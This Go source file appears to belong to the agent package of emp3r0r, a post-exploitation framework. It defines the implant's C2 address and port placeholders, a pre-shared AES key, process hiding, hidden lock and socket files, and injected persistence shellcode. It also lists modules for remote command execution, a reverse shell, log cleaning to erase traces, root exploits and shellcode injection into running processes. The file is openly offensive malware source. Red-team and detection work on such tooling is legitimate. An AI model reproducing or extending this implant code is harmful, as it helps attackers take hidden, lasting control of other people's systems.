package agent

import (
	"context"
	"fmt"
	"net/http"
	"os"
	"strconv"

	"github.com/jm33-m0/emp3r0r/core/internal/tun"
	"github.com/posener/h2conn"
	"github.com/txthinking/socks5"
)

var (
	// CCAddress how our agent finds its CC
	CCAddress = "https://[cc_ipaddr]"

	// Transport what transport is this agent using? (HTTP2 / CDN / TOR)
	Transport = fmt.Sprintf("HTTP2 (%s)", CCAddress)

	// AESKey generated from Tag -> md5sum, type: []byte
	AESKey = tun.GenAESKey("Your Pre Shared AES Key: " + OpSep)

	// HTTPClient handles agent's http communication
	HTTPClient *http.Client

	// H2Json the connection to CC, for JSON message-based communication
	H2Json *h2conn.Conn

	// ProxyServer Socks5 proxy listening on agent
	ProxyServer *socks5.Server

	// AgentProxy used by this agent to communicate with CC server
	AgentProxy = ""

	// HIDE_PIDS all the processeserr from emp3r0r
	HIDE_PIDS = []string{strconv.Itoa(os.Getpid())}

	// GuardianShellcode inject into a process to gain persistence
	GuardianShellcode = `[persistence_shellcode]`

	// GuardianAgentPath where the agent binary is stored
	GuardianAgentPath = "[persistence_agent_path]"
)

const (
	// Version record version on build time
	Version = "[emp3r0r_version_string]"

	// AgentRoot root directory of emp3r0r
	AgentRoot = "[agent_root]"

	// UtilsPath binary path of utilities
	UtilsPath = AgentRoot + "/bin"

	// Libemp3r0rFile shard library of emp3r0r, for hiding and persistence
	Libemp3r0rFile = UtilsPath + "/libemp3r0r.so"

	// PIDFile stores agent PID
	PIDFile = AgentRoot + "/.e.lock"

	// SocketName name of our unix socket
	SocketName = AgentRoot + "/.s6Y4tDtahIuL"

	// CCPort port of c2
	CCPort = "[cc_port]"

	// ProxyPort start a socks5 proxy to help other agents, on 0.0.0.0:port
	ProxyPort = "[proxy_port]"

	// BroadcastPort port of broadcast server
	BroadcastPort = "[broadcast_port]"

	// CCIndicator check this before trying connection
	CCIndicator = "[cc_indicator]"

	// Tag uuid of this agent
	Tag = "[agent_uuid]"

	// OpSep separator of CC payload
	OpSep = "cb433bd1-354c-4802-a4fa-ece518f3ded1"

	// RShellBufSize buffer size of reverse shell stream
	RShellBufSize = 128

	// ProxyBufSize buffer size of port fwd
	ProxyBufSize = 1024
)

// Module names
const (
	ModCMD_EXEC    = "cmd_exec"
	ModCLEAN_LOG   = "clean_log"
	ModLPE_SUGGEST = "lpe_suggest"
	ModPERSISTENCE = "get_persistence"
	ModPROXY       = "run_proxy"
	ModPORT_FWD    = "port_fwd"
	ModSHELL       = "interactive_shell"
	ModVACCINE     = "vaccine"
	ModINJECTOR    = "injector"
	ModGET_ROOT    = "get_root"
)

// Module help info
var ModuleDocs = map[string]string{
	ModCMD_EXEC:    "Run a single command on a target",
	ModCLEAN_LOG:   "Delete lines containing keyword from *tmp logs",
	ModLPE_SUGGEST: "Run linux-smart-enumeration or linux exploit suggester",
	ModPERSISTENCE: "Get persistence via built-in methods",
	ModPROXY:       "Start a socks proxy on target, and use it locally on C2 side",
	ModPORT_FWD:    "Port mapping from agent to CC (or vice versa), via emp3r0r's HTTP2 (or other) tunnel",
	ModSHELL:       "Run custom bash on target, a perfect reverse shell",
	ModVACCINE:     "Vaccine helps you install additional tools on target system",
	ModINJECTOR:    "Inject shellcode into a running process with GDB",
	ModGET_ROOT:    "Try some built-in LPE exploits",
}

// SystemInfo agent properties
type SystemInfo struct {
	Tag         string   // identifier of the agent
	Transport   string   // transport the agent uses (HTTP2 / CDN / TOR)
	Hostname    string   // Hostname and machine ID
	Hardware    string   // machine details and hypervisor
	Container   string   // container tech (if any)
	CPU         string   // CPU info
	Mem         string   // memory size
	OS          string   // OS name and version
	Kernel      string   // kernel release
	Arch        string   // kernel architecture
	IP          string   // public IP of the target
	IPs         []string // IPs that are found on target's NICs
	ARP         []string // ARP table
	User        string   // user account info
	HasRoot     bool     // is agent run as root?
	HasTor      bool     // is agent from Tor?
	HasInternet bool     // has internet access?

	Process *AgentProcess // agent's process
}

// AgentProcess process info of our agent
type AgentProcess struct {
	PID     int    // pid
	PPID    int    // parent PID
	Cmdline string // process name and command line args
	Parent  string // parent process name and cmd line args
}

// MsgTunData data to send in the tunnel
type MsgTunData struct {
	Payload string `json:"payload"` // payload
	Tag     string `json:"tag"`     // tag of the agent
}

// H2Conn add context to h2conn.Conn
type H2Conn struct {
	Conn   *h2conn.Conn
	Ctx    context.Context
	Cancel context.CancelFunc
}
